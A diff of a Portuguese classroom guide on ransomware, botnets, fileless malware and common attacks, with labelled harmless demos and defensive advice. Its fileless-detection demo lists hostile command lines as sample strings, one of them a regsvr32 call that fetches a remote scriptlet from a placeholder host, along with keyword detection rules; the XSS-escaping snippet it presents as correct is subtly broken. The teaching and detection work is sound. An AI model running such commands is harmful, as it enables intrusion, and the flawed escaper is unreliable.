@@ -1402,148 +1402,682 @@ Em produção, prefira ferramentas dedicadas (AIDE, Wazuh, Tripwire) e integraç
 
 ---
 
-# 🔹 Ransomware
+# 🔹 Ransomware — Visão Didática
 
 ## 📌 Definição
-Ransomware é um tipo de malware de extorsão que **sequestra dados** via criptografia e exige **pagamento de resgate** (geralmente em criptomoedas).  
+**Ransomware** é um tipo de malware de **extorsão** que **sequestra dados** por criptografia e exige **pagamento de resgate** (geralmente em criptomoedas) para suposta recuperação.
 
-## 📌 Propagação
+---
+
+## 🔧 Como funciona (alto nível)
+- **Acesso inicial:** engenharia social (phishing), exploração de serviços expostos (RDP/SMB), downloads enganosos.
+- **Preparação:** reconhecimento do ambiente, tentativa de elevar privilégios e localizar dados/compartilhamentos.
+- **Persistência & evasão:** criação de tarefas/serviços, ofuscação, tentativa de desativar defesas.
+- **Criptografia:** escolha de diretórios-alvo, geração/derivação de chaves, criptografia em massa, **anotações de resgate**.
+- **Extorsão:** simples (criptografia) ou **dupla** (criptografia + ameaça de vazamento de dados).
+- **Movimento lateral:** após um host, tenta alcançar **outros** para ampliar o impacto.
+
+---
+
+## 📡 Propagação
 - Phishing com links/arquivos maliciosos.  
 - Documentos com macros.  
 - Exploração de vulnerabilidades (RDP/SMB).  
 - Downloads infectados.  
 - Movimento lateral na rede.  
 
-## 📌 Impactos
-- Indisponibilidade de dados.  
-- Paralisação de operações.  
-- Perdas financeiras e multas.  
-- Danos à reputação.  
-- Vazamento de dados (*double extortion*).  
+---
 
-## 📌 Tipos
-1. **Crypto-Ransomware:** criptografa arquivos (ex.: WannaCry).  
-2. **Locker Ransomware:** bloqueia a tela, sem criptografar arquivos.  
-3. **Scareware:** assusta com mensagens falsas.  
-4. **Doxware/Leakware:** ameaça divulgar dados roubados.  
-5. **Ransomware-as-a-Service (RaaS):** modelo de negócio alugado a criminosos.  
-6. **Mobile Ransomware:** afeta smartphones, bloqueando PIN ou criptografando arquivos.  
-
-## 📌 Exemplos Famosos
-- WannaCry, Petya/NotPetya, Locky, Ryuk.  
+## 💥 Impactos
+- **Indisponibilidade** de dados/sistemas.  
+- **Paralisação** de operações.  
+- **Perdas financeiras** (recuperação, multas, interrupção).  
+- **Danos reputacionais**.  
+- **Vazamento** de dados (*double extortion*).  
 
 ---
 
-# 🔹 Outros Tipos de Ameaças
-
-## 1. Botnets
-- **O que são:** redes de dispositivos infectados controlados remotamente (zumbis).  
-- **Objetivos:** DDoS, spam, distribuição de malware, mineração.  
-- **Exemplos:** Mirai, Zeus.  
-- **Defesa:** atualização de IoT, troca de senhas padrão, monitoramento de tráfego.  
-
-## 2. Scareware
-- **O que é:** simula alertas falsos de vírus para forçar compra de softwares inúteis.  
-- **Exemplo:** pop-ups de “seu PC está infectado!”.  
-- **Defesa:** antivírus legítimo, não clicar em links suspeitos.  
-
-## 3. Cryptojacking
-- **O que é:** usa CPU/GPU da vítima para minerar criptomoedas.  
-- **Formas:** malware local ou scripts em sites.  
-- **Defesa:** bloqueadores de mineração, monitoramento de performance.  
-
-## 4. Fileless Malware
-- **O que é:** atua somente na memória, sem gravar arquivos no disco.  
-- **Exemplo:** scripts PowerShell/WMI maliciosos.  
-- **Defesa:** EDR, bloqueio de macros, princípio do menor privilégio.  
+## 🧬 Tipos (alto nível)
+1. **Crypto-Ransomware:** criptografa arquivos (ex.: “.lock”, “.encrypted”).  
+2. **Locker Ransomware:** bloqueia a **tela**/sessão sem criptografar arquivos.  
+3. **Scareware:** simula “infecções” para induzir pagamento.  
+4. **Doxware/Leakware:** rouba e ameaça **publicar** dados.  
+5. **RaaS (Ransomware-as-a-Service):** afiliados “alugam” a operação.  
+6. **Mobile Ransomware:** bloqueia PIN/criptografa dados em **smartphones**.  
 
 ---
 
-# 🔹 Tipos de Ataques em Segurança
-
-## 1. Phishing
-- E-mails/mensagens falsas simulando instituições.  
-- **Objetivo:** roubo de credenciais.  
-- **Defesa:** conscientização, MFA, filtros.  
-
-## 2. Spear Phishing
-- Phishing direcionado a vítimas específicas.  
-- **Exemplo:** setor de RH.  
-- **Defesa:** checagem fora do canal digital.  
-
-## 3. Whaling
-- Focado em executivos e alta gestão.  
-- **Exemplo:** fraudes CEO fraud.  
-- **Defesa:** dupla checagem em transferências.  
-
-## 4. Engenharia Social
-- Manipulação psicológica para obter informações.  
-- **Exemplo:** ligação se passando por suporte.  
-
-## 5. Ataques de Senha
-- **Brute Force, Dictionary, Credential Stuffing.**  
-- **Defesa:** senhas fortes, MFA, limitação de tentativas.  
-
-## 6. Ataques de Rede
-- **Sniffing, Spoofing, Man-in-the-Middle.**  
-- **Defesa:** criptografia (HTTPS, VPN), IDS/IPS.  
-
-## 7. DoS/DDoS
-- Sobrecarga para indisponibilizar serviços.  
-- **Exemplo:** Mirai.  
-- **Defesa:** mitigação em nuvem, balanceadores.  
-
-## 8. Exploração de Vulnerabilidades
-- **Exemplo:** SMBv1 no WannaCry.  
-- **Defesa:** patching, pentests.  
-
-## 9. SQL Injection e XSS
-- **SQLi:** manipulação de banco de dados.  
-- **XSS:** injeção de scripts em sites.  
-- **Defesa:** validação de entrada, WAF.  
-
-## 10. Zero-Day
-- Exploração de falha ainda desconhecida.  
-- **Defesa:** monitoramento comportamental, bug bounty.  
+## 🔎 IoCs (Indicadores de Comprometimento)
+- **Pico súbito** de criação/modificação/renomeação de arquivos.  
+- **Novas extensões** nos arquivos (ex.: sufixos incomuns) e **notas de resgate** em várias pastas.  
+- Processos invocando **criptografia intensiva** e acessos simultâneos a muitos diretórios compartilhados.  
+- **Tentativas de desabilitar proteções** e apagar cópias de segurança locais.  
+- **Beacons** para domínios recém-registrados; conexões a serviços de anonimato.  
+- Criação de **tarefas/serviços** recentes e alterações em políticas de segurança.
 
 ---
 
-# 🔹 Boas Práticas de Defesa
+## 🛡️ Mitigação & Resposta
+**Prevenção**
+- **Backups 3-2-1** testados e, se possível, **imutáveis/offline**.  
+- **MFA** (especialmente para VPN/RDP/SSO) e **privilégios mínimos**.  
+- **Patching** e redução de superfície (fechar RDP à internet; usar VPN/proxy).  
+- **EDR/XDR** com bloqueio comportamental, isolamento rápido e regras para *ransom notes* / explosões de I/O.  
+- **Segmentação de rede**, catálogo de software e **allowlisting**.
 
-## 1. Atualizações e patches regulares
-- **Por que:** fecham falhas conhecidas.  
-- **Exemplo:** falha explorada pelo WannaCry.  
+**Resposta (alto nível)**
+- **Isolar** rapidamente o host/rede afetados.  
+- **Preservar artefatos** (logs/memória) e identificar “paciente zero”.  
+- **Erradicar persistências**, **rotacionar credenciais**, revisar acessos.  
+- **Restaurar** somente de **backups limpos**; validar integridade antes de reintroduzir em produção.  
+- **Comunicação** coordenada (jurídico, stakeholders) e lições aprendidas.
 
-## 2. Uso de antivírus e antimalware
-- **Por que:** detectam malwares conhecidos.  
-- **Complemento:** EDR/XDR para análise em tempo real.  
+---
 
-## 3. Backup frequente dos dados críticos
-- **Regra 3-2-1:** 3 cópias, 2 mídias, 1 offsite.  
-- **Exemplo:** hospitais recuperados após ransomware.  
+## 🧪 Demos 100% Seguras para Sala (Sem Malware)
 
-## 4. Autenticação multifator (MFA)
-- **Protege mesmo com senha vazada.**  
-- **Exemplo:** reduzir credential stuffing.  
+> Objetivo: **ilustrar conceitos** (bloqueio, criptografia, resposta e detecção) **sem** tocar em arquivos do sistema ou automatizar comportamentos maliciosos.
 
-## 5. Monitoramento contínuo e resposta a incidentes
-- **Ferramentas:** SIEM, SOC/CSIRT, playbooks de resposta.  
-- **Exemplo:** detectar tráfego anormal para C2.  
+### 1) “Locker” didático (bloqueio de tela **falso**)
+*Simula um bloqueio com mensagem de “resgate”; um código conhecido ‘desbloqueia’.*  
+Salve como `locker_demo.html` e abra no navegador.
 
-## 6. Treinamento de usuários
-- **Por que:** humanos são elo fraco.  
-- **Exemplo:** simulação de phishing reduz chance de ataques em 70%.  
+```html
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>[DEMO] Locker (simulação inofensiva)</title>
+<style>
+  body{margin:0;font-family:system-ui;background:#0b0f1a;color:#e7ecf3}
+  .full{position:fixed;inset:0;display:grid;place-items:center;background:#0b0f1acc}
+  .card{max-width:560px;background:#141a2b;border:1px solid #26324a;border-radius:16px;padding:24px;box-shadow:0 16px 48px rgba(0,0,0,.5)}
+  input,button{padding:10px 12px;border-radius:10px;border:1px solid #2f3d5a}
+  button{background:#4f7cff;color:#fff;border:0;font-weight:700;cursor:pointer}
+  .muted{color:#9fb1d1}
+</style>
+</head>
+<body>
+  <div class="full" id="overlay">
+    <div class="card" role="alertdialog" aria-label="Simulação de ransom locker">
+      <h1>🔒 Seus dados foram “bloqueados” (DEMO)</h1>
+      <p class="muted">Isto é uma simulação educativa. Nada foi criptografado.</p>
+      <p>Para desbloquear, insira o <strong>código didático</strong> e clique em “Desbloquear”.</p>
+      <div style="display:flex;gap:8px">
+        <input id="code" placeholder="Código">
+        <button id="unlock">Desbloquear</button>
+      </div>
+      <p class="muted" style="margin-top:10px">Dica: em ataques reais, “notas de resgate” aparecem em várias pastas.</p>
+    </div>
+  </div>
+<script>
+  const CODE = "AULA-1234"; // informe aos alunos previamente
+  document.getElementById('unlock').onclick = () => {
+    const ok = document.getElementById('code').value.trim() === CODE;
+    alert(ok ? "Liberado: lembre-se de backups 3-2-1 e MFA." :
+               "Código incorreto (DEMO).");
+    if (ok) document.getElementById('overlay').style.display = 'none';
+  };
+</script>
+</body>
+</html>
+```
 
-👉 **Defesa em profundidade:** camadas de segurança combinando **tecnologia, processos e pessoas**.  
+---
 
--------
+### 2) Mini-lab de criptografia em memória (AES-GCM)
+Mostra o “coração” do sequestro (criptografia) sem tocar no disco.  
+Instale a lib:
+```bash
+pip install cryptography
+```
 
-1) Phishing (didático e inofensivo)
+**Código (salve como `crypto_lab_memoria.py`):**
+```python
+import os, json, base64
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
-O que mostra: como uma página falsa poderia enganar alguém — sem coletar dados, sem rede, e com aviso educativo claro.
+b64e = lambda b: base64.b64encode(b).decode()
+b64d = lambda s: base64.b64decode(s.encode())
 
-Salve como phishing_demo.html e abra no navegador.
+def derivar(senha, sal):
+    return PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=sal, iterations=300_000).derive(senha.encode())
 
+def cifrar(msg, senha):
+    sal = os.urandom(16); chave = derivar(senha, sal); gcm = AESGCM(chave); nonce = os.urandom(12)
+    ct = gcm.encrypt(nonce, msg.encode(), None)
+    return json.dumps({"salt": b64e(sal), "nonce": b64e(nonce), "ct": b64e(ct)}, indent=2)
+
+def decifrar(pkg, senha):
+    d = json.loads(pkg); sal, nonce, ct = b64d(d["salt"]), b64d(d["nonce"]), b64d(d["ct"])
+    chave = derivar(senha, sal); return AESGCM(chave).decrypt(nonce, ct, None).decode()
+
+if __name__ == "__main__":
+    senha = "SenhaDidatica123!"
+    pacote = cifrar("Conteúdo SIMULADO (apenas memória).", senha)
+    print(">>> CIFRADO:\n", pacote)
+    print("\n>>> DECIFRADO:\n", decifrar(pacote, senha))
+```
+
+Pontos didáticos: senha → chave (PBKDF2 + sal), nonce único e AEAD (confidencialidade + integridade).
+
+---
+
+### 3) “Backup & Restore” didático (sem código malicioso)
+Demonstra o efeito de “dados inacessíveis sem senha” com ferramenta legítima.
+
+**Criar pasta e arquivo (Windows PowerShell / macOS/Linux):**
+```powershell
+mkdir LAB_SEGURO
+"Olá, mundo seguro!" | Out-File -Encoding utf8 LAB_SEGURO\exemplo.txt
+```
+```bash
+mkdir -p LAB_SEGURO && printf "Olá, mundo seguro!\n" > LAB_SEGURO/exemplo.txt
+```
+
+**Compactar com senha (7-Zip):**
+```powershell
+# Windows (ajuste caminho do 7z.exe se necessário)
+& "C:\Program Files\7-Zip\7z.exe" a -t7z LAB_ENCRIPTADO.7z ".\LAB_SEGURO\*" -pSenhaDidatica123! -mhe=on
+```
+```bash
+# macOS/Linux (p7zip)
+7z a -t7z LAB_ENCRIPTADO.7z ./LAB_SEGURO/* -pSenhaDidatica123! -mhe=on
+```
+
+`-mhe=on` protege inclusive nomes de arquivos. Em seguida, descompacte com a senha para demonstrar recuperação.
+
+---
+
+### 4) “Tempestade de arquivos” — log sintético para detectar
+Mostra como um SOC/EDR enxerga o surto de mudanças (apenas imprime).
+
+**Salve como `storm_log_sim.py`:**
+```python
+import time, random, datetime, string
+def fake_name():
+    base = ''.join(random.choices(string.ascii_lowercase, k=6))
+    return f"{base}.docx -> {base}.docx.lock"
+for i in range(20):
+    ts = datetime.datetime.now().isoformat(timespec="seconds")
+    print(f"{ts} EVENT=RENAME FILE={fake_name()} PROC=simulador.exe USER=aluno")
+    time.sleep(0.1 if i<10 else 0.02)  # acelera para simular “surto”
+print("Resumo: pico anômalo de renomeações — indício clássico a ser investigado.")
+```
+
+Mensagem: ferramentas de defesa buscam padrões de explosão de I/O e criação de ransom notes.
+
+---
+
+## 🗺️ Roteiro sugerido (20–25 min)
+- Definição + cadeia (5 min).  
+- Locker didático (3–5 min).  
+- Cripto em memória (5–7 min) — conceitos de chave/sal/nonce.  
+- Backup & restore (5 min).  
+- Detecção com log sintético (3–5 min) → discussão de IoCs/playbook.
+
+---
+
+# 🔹 Outros Tipos de Ameaças — Visão Didática
+
+---
+
+## 1) 🕸️ Botnets
+
+### O que são
+Redes de dispositivos **infectados e controlados remotamente** (bots/zumbis) por um operador (*botmaster*). Servem para **DDoS**, envio de **spam**, **distribuição de malware** e **mineração**.
+
+### Como funciona (alto nível)
+- **Infecção** inicial (phishing, serviço exposto, IoT com senha padrão).
+- **Registro** no C2 (Command & Control) para receber ordens.
+- **Campanhas** coordenadas (ex.: DDoS, spam, “baixe este payload”).
+- **Rotação** de infraestrutura (domínios/endereços trocados para evasão).
+
+### IoCs
+- Muitos hosts fazendo **conexões periódicas (beaconing)** a domínios **recém-registrados**.
+- **Tráfego volumétrico** para um destino único (padrão de DDoS).
+- **Processos idênticos** abrindo conexões de saída em massa.
+- **Dispositivos IoT** com tráfego anômalo fora do perfil.
+
+### Mitigação & Resposta
+- **Atualizar IoT**, trocar **senhas padrão**, desabilitar serviços desnecessários.
+- **Segmentar a rede** (IoT isolado), **deny-by-default** para saídas sensíveis.
+- **EDR/IDS/IPS** com detecção de beaconing; **DNS sinkhole**/bloqueio de domínios novos.
+- **Contenção rápida** (isolar host), **rotacionar credenciais/tokens** e limpar persistências.
+
+### Demos 100% seguras (Sem Malware)
+
+**A) “Mini-botnet” offline (impressões, sem rede)**  
+Salve como `botnet_sim.py`:
+```python
+# DEMO segura: simula 5 "bots" reportando-se a um C2 fictício (sem rede).
+import time, random, uuid, datetime
+C2 = "c2.simulado.local"
+bots = [str(uuid.uuid4())[:8] for _ in range(5)]
+print(f"[start] C2={C2} bots={bots}")
+
+for tick in range(6):
+    ts = datetime.datetime.now().isoformat(timespec="seconds")
+    for b in bots:
+        print(f"[{ts}] bot={b} -> C2={C2} status=ok (simulado)")
+    if tick == 3:
+        cmd = "MOSTRAR_BANNER"  # "ordem" didática
+        print(f"[{ts}] C2 broadcast: {cmd}")
+        for b in bots:
+            print(f"    bot={b} ação={cmd} resultado=feito")
+    time.sleep(random.uniform(0.6, 1.0))
+print("[done] Fim da simulação.")
+```
+
+Como narrar: padrão de beaconing e execução de “comando” centralizado — sem tráfego real.
+
+**B) Log sintético de DDoS (para caça de IoC)**
+```
+2025-09-03T14:10:01 SRC=10.0.10.21 DST=203.0.113.50 DPT=443 BYTES=512
+2025-09-03T14:10:01 SRC=10.0.10.22 DST=203.0.113.50 DPT=443 BYTES=520
+2025-09-03T14:10:01 SRC=10.0.10.23 DST=203.0.113.50 DPT=443 BYTES=515
+...
+```
+Exercício: alunos contam fontes distintas → mesmo destino/porta em janelas curtas ⇒ padrão de ataque volumétrico.
+
+---
+
+## 2) 😱 Scareware
+
+### O que é
+Software/alerta enganoso que assusta o usuário (“seu PC está infectado!”) para forçar compra/instalação de algo inútil.
+
+### Como funciona
+- Pop-ups alarmistas, telões com contagem regressiva, simulação de scan.
+- Pressão psicológica para clicar/pagar.
+- Pode tentar instalar PUP/Adware se o usuário “aceitar”.
+
+### IoCs
+- Pop-ups insistentes fora do site acessado.
+- Ofertas “milagrosas” com gramática ruim URGÊNCIA/AMEAÇA.
+- Redirecionamentos para pagamentos.
+
+### Mitigação & Resposta
+- Antivírus legítimo, navegador atualizado e bloqueio de pop-ups.
+- Educação: não clicar, fechar a aba/janela, limpar extensões.
+- EDR para bloquear instaladores suspeitos.
+
+### Demo segura (HTML inofensivo)
+Salve como `scareware_demo.html`:
+```html
+<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
+<title>[DEMO] Scareware</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{margin:0;background:#0f0f10;color:#e9ecef;font-family:system-ui;display:grid;place-items:center;min-height:100vh}
+.panel{max-width:560px;background:#1e2233;border:1px solid #2f3650;padding:28px;border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,.5)}
+.warn{color:#ff6b6b;font-weight:700}.muted{color:#aeb6c8}.btn{margin-top:16px;display:inline-block;background:#ff4757;color:#fff;padding:10px 14px;border-radius:10px;font-weight:700;cursor:pointer}</style>
+</head>
+<body>
+  <div class="panel" role="alertdialog">
+    <h1 class="warn">⚠️ SEU COMPUTADOR ESTÁ INFECTADO!</h1>
+    <p class="muted">Clique para “remover todos os vírus imediatamente”.</p>
+    <div class="btn" id="fix">Remover agora</div>
+    <p id="edu" class="muted" style="margin-top:12px;display:none"></p>
+  </div>
+<script>
+  fix.onclick=()=>{edu.style.display='block';
+    edu.textContent="DEMO: isto é scareware. Feche a aba, use antivírus confiável e não pague por 'limpezas' inesperadas.";}
+</script>
+</body></html>
+```
+
+---
+
+## 3) ⛏️ Cryptojacking
+
+### O que é
+Uso indevido de CPU/GPU da vítima para minerar criptomoedas (ganho para o atacante, custo e desgaste para a vítima).
+
+### Como funciona
+- Script em site ou malware local roda “hashes” continuamente.
+- Consumo elevado de CPU/GPU, aquecimento e ruído.
+- Às vezes, só quando o navegador está em foco (para disfarçar).
+
+### IoCs
+- CPU/GPU alta sem motivo; fans no máximo.
+- Processo de navegador consumindo muito tempo.
+- Scripts de terceiros carregados de domínios estranhos.
+
+### Mitigação & Resposta
+- Bloqueadores de mineração no navegador; política de scripts de terceiros (CSP/SRI).
+- Monitoramento de performance e alerts por uso anômalo.
+- EDR para detectar mineradores e persistências.
+
+### Demo segura (HTML com botão Iniciar/Parar)
+Salve como `cryptojacking_demo.html`:
+```html
+<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
+<title>[DEMO] Cryptojacking (simulado)</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font-family:system-ui;background:#0c111b;color:#e7ebf3;display:grid;place-items:center;min-height:100vh}
+.card{background:#141a2b;border:1px solid #26324a;border-radius:16px;padding:28px;max-width:540px}
+button{border:0;border-radius:10px;padding:10px 14px;font-weight:700;cursor:pointer}
+.start{background:#4f7cff;color:#fff}.stop{background:#ff5d5d;color:#fff}
+progress{width:100%}.muted{color:#9fb1d1}</style></head>
+<body>
+<div class="card">
+  <h1>Simulação de uso excessivo de CPU</h1>
+  <p class="muted">Demonstra como scripts podem consumir recursos (sem minerar).</p>
+  <div style="display:flex;gap:10px;margin:12px 0">
+    <button class="start" id="start">Iniciar</button>
+    <button class="stop" id="stop" disabled>Parar</button>
+  </div>
+  <p>Operações/seg (simulado): <strong id="ops">0</strong></p>
+  <progress id="load" max="100" value="0"></progress>
+</div>
+<script>
+let run=false, rid=null;
+function heavy(n){let x=0;for(let i=0;i<n;i++){x=(x*1664525+1013904223)>>>0;}return x;}
+function loop(){
+  if(!run) return;
+  const t=performance.now(); let ops=0;
+  while(performance.now()-t<200){heavy(5000);ops++;}
+  opsEl.textContent=String(ops); load.value=Math.min(100,20+ops);
+  rid=requestAnimationFrame(loop);
+}
+const start=document.getElementById('start'), stop=document.getElementById('stop'), opsEl=document.getElementById('ops'), load=document.getElementById('load');
+start.onclick=()=>{run=true;start.disabled=true;stop.disabled=false;loop();};
+stop.onclick=()=>{run=false;cancelAnimationFrame(rid);start.disabled=false;stop.disabled=true;opsEl.textContent="0";load.value=0;};
+</script>
+</body></html>
+```
+
+---
+
+## 4) 🧪 Fileless Malware
+
+### O que é
+Ataques que não gravam arquivos no disco: operam apenas na memória, abusando de ferramentas legítimas (living off the land) como PowerShell, WMI, rundll32, etc.
+
+### Como funciona
+- Script embutido/baixado na memória executa via ferramentas já presentes.
+- Persistência por tarefas/agendadores/registro, sem binário novo evidente.
+- Evasão: menos artefatos no disco, dificulta antivírus baseados em assinatura.
+
+### IoCs
+- Linha de comando suspeita: powershell -enc [BASE64...], wscript //e:jscript, rundll32 javascript:....
+- Processos filhos atípicos (Office → PowerShell), AMSI desabilitado.
+- Criação de tarefas logo após execução de script.
+
+### Mitigação & Resposta
+- EDR/XDR com foco em comportamento (criação de processos, cmdline).
+- Bloqueio de macros por padrão; AMSI ativo; Constrained Language Mode.
+- Privilégios mínimos, AppLocker/WDAC, PowerShell Logging e Script Block Logging.
+- Resposta: isolar host, coletar eventos/detonadores, remover persistências e revisar credenciais.
+
+### Demos 100% seguras (Sem executar nada perigoso)
+
+**A) Detector didático de cmdlines suspeitas (offline)**  
+Salve como `fileless_detector_demo.py`:
+```python
+# DEMO segura: marca exemplos de linhas de comando "sinais" de fileless (não executa nada)
+samples = [
+  r'powershell -w hidden -enc [BASE64_PAYLOAD]',
+  r'wscript.exe //e:jscript script.js',
+  r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();',
+  r'regsvr32 /s /n /u /i:https://exemplo.test scrobj.dll',
+  r'wmic process call create "powershell -nop -c [PAYLOAD]"',
+  r'office.exe spawn -> powershell.exe -nop -w hidden'
+]
+rules = ['powershell','-enc','wscript','rundll32','regsvr32','wmic','office','powershell.exe']
+
+print("Sinais (conceituais) em linhas de comando:\n")
+for s in samples:
+  hits = [r for r in rules if r.lower() in s.lower()]
+  flag = "SUSPEITO" if hits else "OK"
+  print(f"[{flag}] {s}\n   ↳ regras: {hits}")
+print("\nObs.: Em EDR real, combine processo pai/filho, cmdline completa e horário.")
+```
+
+**B) “Duas visões” (scripts em memória vs. em disco) – discussão guiada**  
+Mostre que um script pode existir só na memória (ex.: copiado/colado no console) — não faça execução de payload real.  
+Discuta como logging do PowerShell/AMSI e EDR ajudam a ver o conteúdo mesmo sem arquivo no disco.
+
+---
+
+# 🔹 Tipos de Ataques em Segurança — Visão Didática
+
+> Objetivo: explicar **como identificar e se defender**, com **demos 100% seguras** (sem exploração, sem rede e sem persistência).
+
+---
+
+## 1) 🎣 Phishing
+**O que é:** e-mails/mensagens falsas simulando instituições.  
+**Objetivo:** roubo de credenciais/dados.
+
+**IoCs**
+- Domínios parecidos (ex.: `pág-bank.com` vs `pagbank.com`), erros de gramática/urgência.
+- Links encurtados/estranhos; anexos inesperados (ZIP, DOC com macros).
+
+**Mitigação**
+- **Conscientização**, **MFA**, filtros anti-phishing, **DMARC/DKIM/SPF**.
+- Verificar **URL real** antes de clicar; nunca inserir senha por links recebidos.
+
+**Demo segura — “texto do link” vs URL real**  
+Salve como `phishing_link_demo.html`:
+```html
+<!doctype html><meta charset="utf-8">
+<title>[DEMO] Phishing: texto vs URL</title>
+<p>Qual é o link verdadeiro? (não navega)</p>
+<ul>
+  <li><a href="https://contasegura.exemplo" onclick="event.preventDefault();alert(this.href);">Banco do Brasil</a></li>
+  <li><a href="https://bb.com.br.seguranca-login.exemplo" onclick="event.preventDefault();alert(this.href);">Banco do Brasil</a></li>
+</ul>
+<p>Dica: passe o mouse/pressione e segure no link para ver a URL real.</p>
+```
+
+---
+
+## 2) 🎯 Spear Phishing
+**O que é:** phishing direcionado (ex.: RH/Finanças).  
+**Mitigação:** validação fora do canal (ligação, ticket), política de dupla checagem para dados sensíveis.
+
+**Exercício rápido (sem código)**  
+Monte um checklist: remetente corporativo? ticket vinculado? link aponta ao domínio oficial? confirmação por telefone interno?
+
+---
+
+## 3) 🐋 Whaling
+**O que é:** ataques a executivos/C-level (ex.: CEO fraud).  
+**Mitigação:** workflow de aprovação em transferências, alerta de “urgência” fora de horário, contas VIP com MFA forte e treinamento específico.
+
+**Simulação didática**  
+Peça à turma para propor um fluxo “pedido urgente do CEO” → duas validações humanas + registro em sistema.
+
+---
+
+## 4) 🧠 Engenharia Social
+**O que é:** manipulação psicológica (ex.: “suporte” pedindo senha).  
+**Mitigação:** política “nunca compartilhe senhas”, palavra-secreta para validação por telefone, scripts de atendimento.
+
+**Roteiro de resposta (role-play)**  
+Pergunte nome/ramal/ticket, devolva ligação via número oficial, registre tentativa.
+
+---
+
+## 5) 🔐 Ataques de Senha
+**Tipos:** Brute Force, Dictionary, Credential Stuffing (reuso de senhas vazadas).  
+**Mitigação:** MFA, senhas fortes/gerenciador, rate-limit e bloqueio progressivo, monitoramento de vazamentos.
+
+**Demo segura — Espaço de senhas (sem quebrar nada)**  
+Salve como `password_space_demo.py`:
+```python
+# Calcula o espaço de busca e tempo estimado (puramente didático)
+from math import pow
+alfabetos = {"num":10,"min":26,"min+num":36,"min+mai+num":62}
+tentativas_por_seg = 1_000  # mude para mostrar impacto de rate-limit
+for nome, A in alfabetos.items():
+    for L in (4,6,8,10,12):
+        N = int(pow(A,L))
+        segundos = N / tentativas_por_seg
+        print(f"{nome:12} L={L:2} → {N:.2e} combinações (~{segundos/86400:.2f} dias @{tentativas_por_seg}/s)")
+```
+
+Explique: MFA derruba a utilidade do brute force mesmo com senhas fracas.
+
+---
+
+## 6) 🌐 Ataques de Rede (Sniffing, Spoofing, MITM)
+**Como funcionam:** interceptam/forjam tráfego; em MITM, um atacante fica “entre” cliente e servidor.  
+**Mitigação:** HTTPS/TLS em tudo, HSTS, VPN em redes não confiáveis, IDS/IPS, segmentação.
+
+**Exercício seguro (conceitual)**  
+Abra um site com cadeado e mostre detalhes do certificado (cadeia/emitente).  
+Discuta “o que observar” quando aparece alerta de certificado (nunca ignore).
+
+---
+
+## 7) 🌊 DoS/DDoS
+**O que é:** sobrecarga para indisponibilizar.  
+**Mitigação:** mitigação em nuvem, rate-limit, caches/CDN, auto-scaling, WAF e filtros upstream.
+
+**Demo segura — Log sintético de pico**
+```
+2025-09-03T10:00:00 RPS=1800 SRCs=120 DST=api.exemplo
+2025-09-03T10:00:05 RPS=5200 SRCs=900  DST=api.exemplo  <-- anômalo
+2025-09-03T10:00:10 RPS=9800 SRCs=2000 DST=api.exemplo  <-- mitigação deveria acionar
+```
+**Atividade:** decidir limites e gatilhos de mitigação.
+
+---
+
+## 8) 🧩 Exploração de Vulnerabilidades
+**Exemplo histórico:** SMBv1 no WannaCry.  
+**Mitigação:** patching contínuo, gestão de vulnerabilidades (scan + priorização), pentests e segurança por design.
+
+**Checklist prático**  
+- Inventário → priorize expostos à internet e CVE explorada ativamente.  
+- Política de janela de manutenção e rollback.
+
+---
+
+## 9) 💉 SQL Injection (SQLi) e ✳️ XSS
+**SQLi:** manipula consultas ao banco.  
+**XSS:** injeta script no navegador de vítimas.
+
+**Mitigação:** validação/escape de entrada, ORM/queries parametrizadas, CSP, WAF.
+
+**Demo segura — Parametrização (Python + sqlite3)**
+```python
+# NÃO executa nada perigoso; mostra a forma correta (parametrizada)
+import sqlite3
+db = sqlite3.connect(":memory:")
+db.execute("create table users (id int, name text)")
+db.execute("insert into users values (?,?)", (1,"alice"))
+user_input = "alice' OR '1'='1"  # exemplo clássico (não será injetado)
+rows = db.execute("select * from users where name = ?", (user_input,)).fetchall()
+print("Resultado seguro (parametrizado):", rows)  # retorna vazio
+```
+
+**Demo segura — Escapar conteúdo no front-end**  
+Salve como `xss_safe_demo.html`:
+```html
+<!doctype html><meta charset="utf-8">
+<p>Entrada do usuário:</p>
+<input id="in" placeholder='Ex.: <b>oi</b>'>
+<pre id="out"></pre>
+<script>
+  const esc = s => s.replace(/[&<>"']/g, m=>({"&":"&amp;","<":"&lt;","&gt;":"&gt;","\"":"&quot;","'":"&#39;"}[m]));
+  in.oninput = () => out.textContent = esc(in.value); // sempre textContent/escape
+</script>
+```
+
+---
+
+## 10) 🕳️ Zero-Day
+**O que é:** falha desconhecida/sem correção disponível.  
+**Mitigação:** monitoramento comportamental (EDR/XDR), segmentação de ativos críticos, princípio do menor privilégio, bug bounty e defesa em profundidade.
+
+**Exercício (tabletop, sem código)**  
+“Se amanhã surgir um zero-day crítico no seu gateway SSO, qual o plano?”  
+- Limitar exposição? Regras compensatórias/WAF?  
+- MFA reforçado?  
+- Comunicado interno e telemetria ampliada?
+
+---
+
+# 🔹 Boas Práticas de Defesa — Guia Didático
+
+> Objetivo: consolidar medidas **preventivas e reativas** com exemplos e **laboratórios 100% seguros** para treinamento.
+
+---
+
+## 1) 🔄 Atualizações e Patches Regulares
+**Por que:** fecham **falhas conhecidas** exploradas por ataques amplos.  
+**Como aplicar (essencial):**
+- Habilite **atualização automática** onde possível.
+- Mantenha **inventário** de ativos e **priorize** o que está exposto à internet e CVEs **exploradas ativamente**.
+- Tenha **janela de manutenção** e plano de **rollback**.
+- Use ferramentas de gestão de vulnerabilidades (ex.: scanners) para **medir** e **acompanhar** SLA de correção.
+
+---
+
+## 2) 🛡️ Antivírus/Antimalware + EDR/XDR
+**Por que:** AV/AM bloqueiam **famílias conhecidas**; **EDR/XDR** detectam **comportamentos** (script anômalo, beaconing, lateralidade).  
+**Como aplicar:**
+- Ative **heurística/análise comportamental**.
+- Centralize **telemetria** em **SIEM**.
